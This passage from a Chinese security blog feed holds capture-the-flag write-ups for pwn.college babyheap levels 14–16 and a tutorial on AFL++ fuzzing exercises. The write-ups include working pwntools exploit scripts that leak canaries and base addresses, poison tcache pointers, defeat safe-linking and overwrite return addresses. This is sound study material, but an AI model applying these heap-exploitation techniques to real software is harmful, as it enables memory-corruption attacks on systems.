(malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;stack_free&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 24&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;echo 0 73&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>canary = p.recv(<span class="hljs-number">7</span>)<br><br>canary = p8(<span class="hljs-number">0x0</span>) + canary<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(base_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;win_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(win_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;stack_scanf&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span>+ p64(<span class="hljs-number">0x00</span>) + p64(<span class="hljs-number">0x31</span>))<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;stack_free&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 40&quot;</span>)<br><br><span class="hljs-comment"># pause()</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;scanf&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>pause()<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x48</span> + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(win_addr))<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;quit&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>可能会出错的原因前面提了，win_addr如果存在<code>0x09</code>和<code>0x0a</code>那么就改一下它的地址。canary如果出现这两个字节，那么就多执行几次。</p><p>这里有更简单的办法，因为我们这里选择栈溢出的方式，所以写入的数据有点多，会导致这样的问题。当我们<code>echo</code>出程序基址后，紧接着构造<code>fake chunk</code>。然后malloc出来后，就能echo出很多东西了。包括<code>canary</code>，<code>stack_addr</code>等等。有了<code>stack_addr</code>那么就能直接算出<code>main_ret_addr</code>。</p><p>那么再和前面的level 11一样，通过<code>scanf</code>写<code>next</code>，从而使得chunk的地址为ret_addr，然后写入win_addr就行了。</p><h4 id="level14-1-3"><a href="#level14-1-3" class="headerlink" title="level14.1"></a>level14.1</h4><p>这里不能直接用<code>win_Addr</code>因为它的最低位为<code>0x09</code>是制表符，导致输入截断。改一下就好了。</p><h4 id="level15-0-3"><a href="#level15-0-3" class="headerlink" title="level15.0"></a>level15.0</h4><p>现在没有<code>stack_xxx</code>相关的操作了。但是<code>echo</code>可以泄露出来程序基址和栈地址。但是有个问题，它的<code>free</code>会导致地址指针重置，也就是<code>free 0 </code>后会执行<code>allocations[0]=0</code>。那么之前我们通过<code>echo</code>泄露基地址和栈地址的方式就无法用了。</p><blockquote><p>在此前，我们会先malloc(32)，然后free掉。使得在执行echo的时候，其malloc的就是我们fastbin中的chunk，因此我们传入echo的参数和它申请的地址一致。所以<code>echo 0 0</code>就是<code>/bin/sh</code>的地址，减去偏移就是base_address的地址。<code>echo 0 8</code>就是存data的地址，也就是一个栈上的地址。</p></blockquote><p>相应的，因为申请chunk时地址的递增的，所以我们先申请一个32字节大小的chunk，然后在echo时它也会申请一个32字节大小的chunk，而两个chunk地址之间差<code>0x30</code>，所以我们可以通过<code>echo 0 48</code>来达到原先<code>echo 0 0</code>的效果。</p><p>还有一个问题，由于我们无法获得fastbin中的chunk address。所以无法直接通过<code>read</code>来修改<code>next</code>。因此，依然需要连续的chunk来覆盖。可以先申请三个大小一致的chunk，然后free其中高地址的两个，最后通过read最低地址的chunk来覆盖到fastbin中的chunk。使得next能够指向<code>main_ret_address</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level15.0&quot;</span>)<br><br><span class="hljs-comment"># get program_base_address</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br><span class="hljs-comment"># why 48?</span><br><span class="hljs-comment"># the first bin address: 0x2c0, and the second bin of same size addr: 0x2f0</span><br><span class="hljs-comment"># 0x2f0 - 0x2c0 = 0x30</span><br>p.sendline(<span class="hljs-string">b&quot;echo 0 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>base_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x33f8</span><br>win_addr = base_addr + <span class="hljs-number">0x1B0f</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(base_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;win_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(win_addr))<br><br><span class="hljs-comment"># get stack_address</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;echo 0 56&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>main_ret_adr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) + <span class="hljs-number">0xe</span> + <span class="hljs-number">0x160</span> + <span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_ret_adr:&quot;</span>, <span class="hljs-built_in">hex</span>(main_ret_adr))<br><br><span class="hljs-comment"># read to overwrite &quot;next&quot;</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 1 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 2 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;read 0 72&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x0</span>) + p64(<span class="hljs-number">0x41</span>) + p64(main_ret_adr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 1 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;read 0 8&quot;</span>)<br>p.sendline(p64(win_addr))<br><br><span class="hljs-comment"># win()</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;quit&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level15-1-3"><a href="#level15-1-3" class="headerlink" title="level15.1"></a>level15.1</h4><p>改偏移即可。</p><h4 id="level16-0-1"><a href="#level16-0-1" class="headerlink" title="level16.0"></a>level16.0</h4><p>这题没开PIE啊，可以直接拿到<code>secret</code>的地址。但是glibc 2.31版本变成了2.32版本，引入了<code>safe-linking</code>。</p><blockquote><p>safe-linking主要靠异或实现，主要依赖以下两个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr)</span><br>  ((__typeof (ptr)) ((((<span class="hljs-type">size_t</span>) pos) &gt;&gt; <span class="hljs-number">12</span>) ^ ((<span class="hljs-type">size_t</span>) ptr)))<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><p>这两个函数分别在free和malloc函数中被引用</p></blockquote><p>对于<code>malloc</code>来说：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e))) <span class="hljs-comment">//检查对齐</span><br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于<code>free</code>来说：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  e-&gt;key = tcache_key;<br><br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>next</code>字段将进行<code>next_addr &gt;&gt; 12 ^ next</code>，next的地址右移12位并和next地址的值进行异或。在safe-linking加持下，要想获得tcache中下一个堆块的实际地址，需要知道<code>pos</code>和<code>ptr</code>两个值,<strong>即当前堆块的mem地址，和当前堆块的mem地址的值，得知后异或即可</strong></p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL使用与源码分析</title>
    <link href="/2024/08/21/AFL%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2024/08/21/AFL%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h1><p>基于覆盖率为导向的模糊测试工具</p><h2 id="fuzzing-101"><a href="#fuzzing-101" class="headerlink" title="fuzzing 101"></a>fuzzing 101</h2><h3 id="exercise-1-CVE-2019-13288"><a href="#exercise-1-CVE-2019-13288" class="headerlink" title="exercise 1   CVE-2019-13288"></a>exercise 1   CVE-2019-13288</h3><p>学习AFL工具的基础使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">AFL工具下载</span><br>sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools<br>sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-dev<br><br>cd $HOME<br>git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus<br>export LLVM_CONFIG=&quot;llvm-config-12&quot;<br>make distrib#网络不好可能会报错，部分模式可能用不了，例如unicorn<br>sudo make install<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用afl-gcc编译目标程序，这是因为通过afl编译，会在目标程序中插桩，反馈程序运行状态信息。</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">去到目标程序目录</span><br>export LLVM_CONFIG=&quot;llvm-config-12&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">C程序编译器选择为afl-clang-fast C++程序编译器选择为afl-clang-fast++ --prefix选项是选择编译后可执行文件及依赖存放的位置</span><br>CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;<br>make<br>make install<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用Afl开始进行fuzz</span><br>afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果出现<span class="hljs-string">&quot;core_pattern&quot;</span> 错误</span><br>sudo su<br>echo core &gt;/proc/sys/kernel/core_pattern<br>exit<br></code></pre></td></tr></table></figure><blockquote><p>参数说明：</p><p>-i指示输入文件目录</p><p>-o指示存储变异文件的目录，包括crash等等</p><p>-s指示要使用的静态随机种子</p><p>@@</p></blockquote><p>gdb的使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在编译时加相关参数</span><br>CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install&quot;<br>make<br>make install<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">gdb调试</span><br>gdb --args &lt;调试的程序名&gt; &lt;输入&gt;<br></code></pre></td></tr></table></figure><h3 id="exercise-2-CVE-2009-3895"><a href="#exercise-2-CVE-2009-3895" class="headerlink" title="exercise 2 CVE-2009-3895"></a>exercise 2 CVE-2009-3895</h3><p>学习AFL++的lto模式</p><blockquote><p>LTO模式需要LLVM和clang版本大于11，该模式通常是最佳的。随后依次是afl-clang-fast&#x2F;afl-clang-fast++和afl-gcc-fast&#x2F;afl-g++-fast。关于为什么LTO模式通常是最佳的，在未来源码阅读时应该能解释。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">同样的过程，只不过在编译插桩时，使用afl-clang-lto进行编译即可</span><br></code></pre></td></tr></table></figure><h3 id="exercise-3-CVE-2017-13028"><a href="#exercise-3-CVE-2017-13028" class="headerlink" title="exercise 3 CVE-2017-13028"></a>exercise 3 CVE-2017-13028</h3><p>使用ASan</p><blockquote><p>ASan时AddressSanitizer的一个C和C++的内存错误检查工具，包含一个编译器插桩模块和一个运行时库，可以发现对堆、栈和全局对象的越界访问、释放后重利用、双重释放和内存泄漏等错误。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用ASan</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定AFL_USE_ASAN=1 编译选项再使用afl-clang-lto即可</span><br>AFL_USE_ASAN=1 CC=$HOME/AFLplusplus/afl-clang-lto ./configure --prefix=$HOME/fuzzing_tcpdump/tcpdump_install/<br>AFL_USE_ASAN=1 make<br>AFL_USE_ASAN=1 make install<br></code></pre></td></tr></table></figure><blockquote><p>ASan这个工具，对于FUZZ来说其实是一个负面的作用，因为它的存在，再进行插桩时会造成内存的严重消耗。但是它的主要作用是在crash分析上，我们可以无需经过动态调试(gdb)，就可以得到cransh的相关信息和数据。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">注意，在运行afl-fuzz的时候，如果开启了ASan，那么就需要使用参数-m none</span><br>afl-fuzz -m none -i $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/tests/ -o $HOME/fuzzing_tcpdump/out/ -s 123 -- $HOME/fuzzing_tcpdump/tcpdump_install/sbin/tcpdump -vvvvXX -ee -nn -r @@<br></code></pre></td></tr></table></figure><blockquote><p>-m none是取消内存限制，因为ASan会使用大量的内存</p></blockquote><p>使用ASan后，gdb调试时就不需要再编译了，直接把crash文件作为参数传入即可</p><h3 id="exercise-4-CVE-2016-9297"><a href="#exercise-4-CVE-2016-9297" class="headerlink" title="exercise 4 CVE-2016-9297"></a>exercise 4 CVE-2016-9297</h3><p>lcov工具的使用</p><blockquote><p>lcov是gcc测试覆盖率的前端图形展示工具。它通过收集多个源文件的行、函数和分支的代码覆盖信息（程序执行之后生成gcda、gcno文件）并且将收集后的信息生成HTML页眉。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">第一步是需要在编译时，选择参数 --coverage</span><br>CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared<br>make<br>make install<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">第二步是利用lcov生成覆盖率信息</span><br>cov --zerocounters --directory ./<br>lcov --capture --initial --directory ./ --output-file app.info<br><span class="hljs-meta prompt_">$</span><span class="language-bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w <span class="hljs-variable">$HOME</span>/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff</span><br>lcov --no-checksum --directory ./ --capture --output-file app2.info<br></code></pre></td></tr></table></figure><blockquote><ul><li><code>lcov --zerocounters --directory ./</code> : 重置之前的计数</li><li><code>lcov --capture --initial --directory ./ --output-file app.info</code> : -c捕获，-i初始化,-d应用的目录，-o输出文件</li><li><code>$HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff</code>：执行目标程序，以及目标程序的输入文件。</li><li><code>lcov --no-checksum --directory ./ --capture --output-file app2.info</code>：将当前覆盖状态保存到app2.info中</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">最后使用genhtml将覆盖率信息转为html文件</span><br>genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info<br><span class="hljs-meta prompt_"># </span><span class="language-bash">最后打开这个html文件，即可看到更直观的代码覆盖率信息</span><br></code></pre></td></tr></table></figure><h3 id="exercise-5-CVE-2017-9048"><a href="#exercise-5-CVE-2017-9048" class="headerlink" title="exercise 5 CVE-2017-9048"></a>exercise 5 CVE-2017-9048</h3><p>多实例进行fuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">master instance</span><br>./afl-fuzz -i afl_in -o afl_out -M Master -- ./program @@<br><span class="hljs-meta prompt_"># </span><span class="language-bash">N-1 number of slaves</span><br>./afl-fuzz -i afl_in -o afl_out -S Slave1 -- ./program @@<br>./afl-fuzz -i afl_in -o afl_out -S Slave2 -- ./program @@<br>...<br>./afl-fuzz -i afl_in -o afl_out -S SlaveN -- ./program @@<br></code></pre></td></tr></table></figure><p>afl的字典功能——dictionary</p><blockquote><p>字典就是告诉AFL应该基于什么模板去进行变异，变异后的数据要符合模板的相关结构。这样能大大提高变异后数据有效性</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">afl使用-x指定字典</span><br>afl-fuzz -m none -i ./afl_in -o afl_out -s 123 -x $HOME/AFLplusplus/dictionaries/xml.dict -D -M master -- ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@<br></code></pre></td></tr></table></figure><h3 id="exercise-6-CVE-2016-4994"><a href="#exercise-6-CVE-2016-4994" class="headerlink" title="exercise 6 CVE-2016-4994"></a>exercise 6 CVE-2016-4994</h3><p>afl的persistent模式</p><blockquote><p>在persistent模式下，AFL++在单个fork进程中对目标进行多次模糊测试，而不是为每次模糊测试执行fork一个新进程。该模式可以将模糊测试速度提高20倍。</p></blockquote><h3 id="exercise-8-CVE-2019-14776"><a href="#exercise-8-CVE-2019-14776" class="headerlink" title="exercise 8 CVE-2019-14776"></a>exercise 8 CVE-2019-14776</h3><p>之前都是白盒，有源码的。现在使用afl的qemu-mode对可执行文件进行fuzz</p><blockquote><p>-Q 选项开启QEMU mode</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:&#x27;/opt/Adobe/Reader9/Reader/intellinux/lib&#x27; afl-fuzz -Q -i ./afl_in/ -o ./afl_out/ -t 2000 -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript @@<br></code></pre></td></tr></table></figure><h2 id="AFL-Source-Code-Analysis"><a href="#AFL-Source-Code-Analysis" class="headerlink" title="AFL Source Code Analysis"></a>AFL Source Code Analysis</h2><h3 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h3><p>第一个函数为<code>find_as</code></p><blockquote><ul><li>AFL_PATH环境变量存在，检查其目录下&#x2F;as文件是否可以访问。可访问则赋值给as_path</li><li>AFL_PATH环境变量不存在，检查argv[0]参数（存储afl-gcc.c的文件目录+文件名称），取目录为dir，并且检查dir&#x2F;afl-as是否可访问，若可访问则dir赋值给as_path</li></ul></blockquote><p>第二个函数为<code>edit_params</code></p><blockquote><p>该函数的主要作用是设置参数，设置编译器(gcc&#x2F;g++&#x2F;clang&#x2F;clang++)。对各个参数进行设置，例如如果存在-fsanitize&#x3D;address，就设置asan_set为1</p></blockquote><p><code>main</code>函数</p><blockquote><p>调用以上函数，并调用execvp函数来执行目标文件。</p></blockquote><h3 id="Assembly-Language-x86"><a href="#Assembly-Language-x86" class="headerlink" title="Assembly Language x86"></a>Assembly Language x86</h3><p>汇编文件后缀.s，用汇编器(Assembler)<code>as</code>把汇编程序中的助记符翻译成机器指令，随机生成目标文件后缀.o。之后使用链接器(linker)将目标文件链接成可执行文件。</p><blockquote><p><code>#</code>注释</p><p><code>.section</code>在汇编程序中由<code>.</code>开头的名称并不是助记符，不会被编译成机器指令，而是用于给汇编器一些指令，称为<strong>汇编指示</strong>或<strong>伪操作</strong>。其中<code>section</code>是用于便于汇编器将程序分段，之后被操作系统加载到不同的页，给不同的段设置不同的权限。</p><p><code>.data</code>用于声明变量的，相当于C语言中的全局变量。</p><p><code>.text</code>是用于存放代码的段，是只读、可执行的。其后的指令都属于<code>.text</code>段</p><p><code>.globl _start</code>声明了一个符号，<code>_start</code>是一个符号，符号在汇编语言中代表一个地址，可以用在指令中，在汇编之后所有的符号都会被替换为相应的地址，就像在C语言中我们用变量名来访问变量，其实就是在访问变量所在的地址，调用函数，就是跳转到函数的第一条指令所在的地址，所以变量名和函数名都是符号，代表相应的地址。<code>.globl</code>指示是用于告诉汇编器，<code>_start</code>要被链接器用到，所以在目标文件的表中标记它是一个全局符合。<code>_start</code>就相当于C语言中的main函数，是程序的入口，需要使用<code>.globl</code>声明，链接器在链接过程中要去寻找<code>_start</code>作为程序入口。如果一个符号没有用<code>.globl</code>声明，那么就不会被链接器用到。</p><p><code>_start:</code>程序入口</p></blockquote><h3 id="afl-as-c"><a href="#afl-as-c" class="headerlink" 